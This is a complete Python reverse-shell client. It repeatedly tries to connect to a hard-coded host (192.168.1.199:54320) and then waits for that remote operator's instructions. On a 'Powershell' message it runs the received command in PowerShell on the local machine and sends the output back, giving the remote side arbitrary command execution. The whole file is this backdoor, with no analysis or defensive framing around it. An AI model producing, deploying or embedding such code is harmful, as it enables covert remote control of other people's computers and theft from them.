import os
import socket
import time
import subprocess

RECONNECT_TIME = 3

def setup():
    host = '192.168.1.199'
    port = 54320
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('[+]\tAttempting to connect....')

    while True:
        try:
            s.connect((host, port))
        except:
            time.sleep(RECONNECT_TIME)
            print('[+]\tAttempting to connect....')
            pass
        else:
            print('[+]\tEstablished connection!')
            break
    start(s)

def start(s):
    while True:
        time.sleep(1)
        data = s.recv(4096)
        data = data.decode()
        print(f'[+]\t{data}')

        if data=='q':
            print('Connection closed')
            s.sendall(b'Connection closed')
            s.close()
        
        elif data=='Powershell':
            powershell(s)

def powershell(s):
    s.sendall(b'Send command')
    command = s.recv(4096)
    shell = subprocess.run(["powershell", "-command", command],capture_output=True)
    s.sendall(shell.stdout)
    s.sendall(b'Command executed')

setup()